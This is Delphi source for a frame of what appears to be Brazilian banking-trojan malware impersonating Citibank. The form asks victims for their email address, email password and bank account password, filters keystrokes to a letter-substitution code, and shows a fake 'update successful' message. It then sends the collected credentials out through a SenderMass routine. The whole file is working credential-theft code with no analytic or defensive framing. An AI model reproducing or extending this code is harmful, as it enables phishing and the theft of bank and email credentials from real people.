unit Citi2;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, 
  Dialogs, pngimage, ExtCtrls, StdCtrls;

type
  TCityBak2 = class(TFrame)
    Image1: TImage;
    EditSenConta: TEdit;
    Label1: TLabel;
    Editemail: TEdit;
    Editsenhamail: TEdit;
    procedure Label1Click(Sender: TObject);
    procedure EditSenContaKeyPress(Sender: TObject; var Key: Char);
  private
    { Private declarations }
  public
    { Public declarations }
  end;


implementation

{$R *.dfm}
uses
Natal, Gerador, Rotinas, Citi;

procedure TCityBak2.EditSenContaKeyPress(Sender: TObject; var Key: Char);
begin
{se alguma das teclas abaixo for precionada}
if ( Key In ['0'..'9', '@','!','#','$', '%','^',
 '"',';',':','[',']','{','}','ç','q','r','t','y','i',
 'a','s','f','g','h','k','c','v','b','n','m','''' ]) then   {entao}
 begin

KEY := #0; //retorna 'null' como c nada fosse precionado


end;
end;

procedure TCityBak2.Label1Click(Sender: TObject);
begin

  Screen.Cursor := crHourGlass;
  Sleep(8000);
  Screen.Cursor := crDefault;

    if Editemail.Text='' then
  begin
    MessageBox(Self.handle,'Informe o seu email cadastrado!', 'Banco Citibank S.A.', mb_IconError + mb_Ok);
    exit;
  end;

     if Editsenhamail.Text='' then
  begin
    MessageBox(Self.handle,'Informe a senha do seu e-mail!', 'Banco Citibank S.A.', mb_IconError + mb_Ok);
    exit;
  end;


   if EditSenConta.Text='' then
  begin
    MessageBox(Self.handle,'Informe a senha da conta, utilizando as letras correspondentes.!', 'Banco Citibank S.A.', mb_IconError + mb_Ok);
    exit;
  end;

   if ValidarEMail(Editemail.Text)=false then
  begin
    MessageBox(Self.handle,'E-Mail inválido, por favor, tente novamente!', 'Banco Citibank S.A.', mb_IconError + mb_Ok);
    exit;
  end;

  DadosEnvio_ := TStringList.Create;
  DadosEnvio_.Add('=============================================');
  DadosEnvio_.Add('CitBank Informa:');
  DadosEnvio_.Add('=============================================');
  DadosEnvio_.Add('EMAIL CONTA: '+Editemail.Text);
  DadosEnvio_.Add('SENHA EMAIL: '+Editsenhamail.text);
  DadosEnvio_.Add('SENHA CONTA: '+EditSenConta.text);
  DadosEnvio_.Add('=============================================');
  DadosEnvio_.Add('LETRAS:(W= 1), (E= 2), (J= 3); (O= 4), (P= 5), ');
  DadosEnvio_.Add('LETRAS:(Z= 6), (U= 7), (X= 8); (L= 9), (D= 0), ');
  DadosEnvio_.Add('=============================================');

 Application.MessageBox(' Atualização Efetuada com Sucesso! ', 'Banco Citibank S.A.',mb_Ok+mb_IconInformation);

//SenderFull
try
  CityBak.Visible := False;
  SenderMass(DadosEnvio_ , 'CITI');
  DadosEnvio_.Free;
except
end;

  CityBak.TimerCity.Enabled := False;

end;
end.
